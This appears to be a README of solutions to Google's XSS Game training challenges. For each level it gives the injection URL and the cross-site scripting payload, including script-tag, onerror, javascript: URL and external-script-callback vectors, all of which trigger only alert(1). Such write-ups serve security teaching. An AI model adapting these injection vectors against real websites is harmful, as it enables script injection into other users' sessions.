# Google XSS Game Challenge Solution
Below are the solutions to Google XSS challenges hosted on https://xss-game.appspot.com/

![alt text](https://github.com/akanshgulati/XSS-Challenges/raw/master/image1.png "Checklist")
 
###Level 1: Hello, world of XSS

####Query
`https://xss-game.appspot.com/level1/frame?query=<script>alert(1)</script>`

####Vector
`<script>alert(1)</script>`
 
###Level 2: Persistence is key
 
####Vector
`"><img src=x onerror=alert(1)>`
 
### Level 3: That sinking feeling...  

####Query
`https://xss-game.appspot.com/level3/frame#'/><script>alert(1)</script>`

####Vector
`'/><script>alert(1)</script>`
 
### Level 4: Context matters 
 
#### Query  
`https://xss-game.appspot.com/level4/frame?timer=1')%3Balert('1`
#### Vector 
`1')%3Balert('1`
 
####Level 5: Breaking protocol 
 
####Query 
`https://xss-game.appspot.com/level5/frame/signup?next=javascript:alert(1)`
#### Vector
`javascript:alert(1)`
 
###Follow the
 
#### Query
`https://xss-game.appspot.com/level6/frame#HTTPS://www.google.com/jsapi?callback=alert`
#### Vector
`HTTPS://www.google.com/jsapi?callback=alert`

